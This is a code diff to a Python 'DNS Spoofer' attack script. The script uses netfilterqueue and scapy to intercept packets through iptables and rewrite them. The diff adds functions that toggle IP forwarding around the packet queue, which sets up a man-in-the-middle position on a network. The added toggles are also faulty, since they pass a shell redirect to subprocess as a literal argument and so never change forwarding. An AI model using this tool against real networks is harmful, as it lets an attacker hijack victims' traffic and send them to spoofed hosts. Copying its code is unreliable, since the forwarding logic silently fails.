@@ -3,11 +3,13 @@ import netfilterqueue
 import scapy.all as scapy
 import sys, os, subprocess
 
+
 def root_check():
     if os.geteuid() != 0:
         sys.exit("[!] This script must run as root")
     else:
         print("[*] Welcome to the DNS Spoofer.")
+
 
 def iptable_insert():
     try:
@@ -27,6 +29,22 @@ def iptable_flush():
         print("[*] Iptables rules flushed")
     except Exception as e:
         print(f"[!] Error flushing iptables: {e}")
+
+
+def forwarding_toggle_on():
+    try:
+        subprocess.run(['echo', '1', '>', '/proc/sys/net/ipv4/ip_forward'], check=True)
+        print("[*] Packet forwarding enabled")
+    except Exception as e:
+        print(f"[!] Error applying packet forwarding: {e}")
+
+def forwarding_toggle_off():
+    try:
+        subprocess.run(['echo', '0', '>', '/proc/sys/net/ipv4/ip_forward'], check=True)
+        print("[*] Packet forwarding disabled")
+    except Exception as e:
+        print(f"[!] Error remowing packet forwarding: {e}")
+
 
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
@@ -55,9 +73,11 @@ def process_packet(packet):
 
     packet.accept()
 
+
 if __name__ == "__main__":
     root_check()
     iptable_insert()
+    forwarding_toggle_on()
 
     # create the object, bind to the iptables command and run
     queue = netfilterqueue.NetfilterQueue()
@@ -80,3 +100,4 @@ if __name__ == "__main__":
         print(f"[!] An error has occurred binding NSQUEU: {e}")
     finally:
         iptable_flush()
+        forwarding_toggle_off()
